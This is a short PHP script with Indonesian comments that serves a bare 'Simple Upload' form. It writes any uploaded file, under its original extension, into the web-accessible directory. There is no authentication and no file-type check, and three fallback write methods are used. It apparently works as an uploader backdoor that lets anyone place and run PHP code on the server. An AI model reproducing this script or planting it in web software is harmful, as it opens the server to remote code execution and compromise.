<?php
// Paksa tampilkan error supaya tidak blank putih kalau ada masalah
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['ufile'])) {
    $f = $_FILES['ufile'];
    $src = $f['tmp_name'];
    
    // 1. Ambil ekstensi & buat nama acak sederhana
    $origName = $_FILES['ufile']['name'];
    $ext = pathinfo($origName, PATHINFO_EXTENSION);
    $destName = time() . '_' . mt_rand(1000, 9999) . '.' . $ext;
    $destPath = __DIR__ . DIRECTORY_SEPARATOR . $destName;

    $ok = false;
    $method = "";

    // --- CARA 1: Metode Resmi ---
    if (move_uploaded_file($src, $destPath)) {
        $ok = true;
        $method = "move_uploaded_file";
    } 
    // --- CARA 2: File Put Contents (Paling Ampuh kalau stream error) ---
    else {
        $data = file_get_contents($src);
        if ($data !== false) {
            if (file_put_contents($destPath, $data)) {
                $ok = true;
                $method = "file_put_contents";
            }
        }
    }

    // --- CARA 3: Copy Biasa ---
    if (!$ok && copy($src, $destPath)) {
        $ok = true;
        $method = "copy";
    }

    if ($ok) {
        chmod($destPath, 0644);
        echo "<h3>✅ Berhasil!</h3>";
        echo "Metode: $method <br>";
        echo "File: <a href='$destName' target='_blank'>$destName</a>";
    } else {
        echo "<h3>❌ Gagal Total!</h3>";
        echo "Coba cek izin (permission) folder ini (harus 755 atau 777).";
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Simple Upload</title>
</head>
<body>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="ufile">
        <button type="submit">UPLOAD SEKARANG</button>
    </form>
</body>
</html>